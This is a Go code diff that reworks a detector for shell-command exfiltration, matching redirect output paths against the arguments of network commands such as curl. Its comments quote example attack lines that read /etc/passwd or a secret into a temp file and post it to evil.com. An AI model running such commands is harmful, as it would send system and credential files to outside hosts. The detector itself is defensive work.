@@ -986,25 +986,49 @@ func detectExfilRedirect(info *ExtractedInfo, commands []parsedCommand) {
 		return // already detected (e.g., from nested shell)
 	}
 
-	// The redirect and exfil command must come from DIFFERENT commands.
-	// A single "curl url > file" is just saving output, not exfiltrating.
-	// The attack pattern is: "cat secret > tmp && curl -d @tmp evil.com"
-	// where one command writes sensitive data and another exfils it.
-	hasRedirectFromNonExfil := false
-	hasExfilCmd := false
+	// Detects the write-then-exfil pattern using parsed AST data:
+	//   cat /etc/passwd > /tmp/out && curl -d @/tmp/out evil.com
+	//
+	// Collects all redirect output paths from non-exfil commands, then
+	// checks if any exfil command references those paths in its arguments
+	// (directly or via @path syntax like curl -d @file).
+	//
+	// NOT flagged:
+	//   - "curl url > file" — exfil cmd's own redirect (not from another cmd)
+	//   - "Curl & A>A" — exfil cmd doesn't reference the redirect path
+	//   - "cat file > /tmp/out && curl unrelated.com" — no path overlap
+	var redirectPaths []string
+	var exfilCmds []parsedCommand
 	for _, pc := range commands {
 		base := strings.ToLower(stripPathPrefix(pc.Name))
-		isExfil := exfilNetworkCommands[base]
-		if isExfil {
-			hasExfilCmd = true
-		}
-		if len(pc.RedirPaths) > 0 && !isExfil {
-			hasRedirectFromNonExfil = true
+		if exfilNetworkCommands[base] {
+			exfilCmds = append(exfilCmds, pc)
+		} else if len(pc.RedirPaths) > 0 {
+			redirectPaths = append(redirectPaths, pc.RedirPaths...)
 		}
 	}
 
-	if hasRedirectFromNonExfil && hasExfilCmd {
-		info.ExfilRedirect = true
+	if len(redirectPaths) == 0 || len(exfilCmds) == 0 {
+		return
+	}
+
+	// Check if any exfil command references a redirect output path.
+	for _, ec := range exfilCmds {
+		for _, arg := range ec.Args {
+			// curl -d @/tmp/out — strip @ prefix for path comparison
+			checkArg := strings.TrimPrefix(arg, "@")
+			if slices.Contains(redirectPaths, checkArg) {
+				info.ExfilRedirect = true
+				return
+			}
+		}
+		// Also check exfil command's input redirects (< /tmp/out)
+		for _, inPath := range ec.RedirInPaths {
+			if slices.Contains(redirectPaths, inPath) {
+				info.ExfilRedirect = true
+				return
+			}
+		}
 	}
 }
 
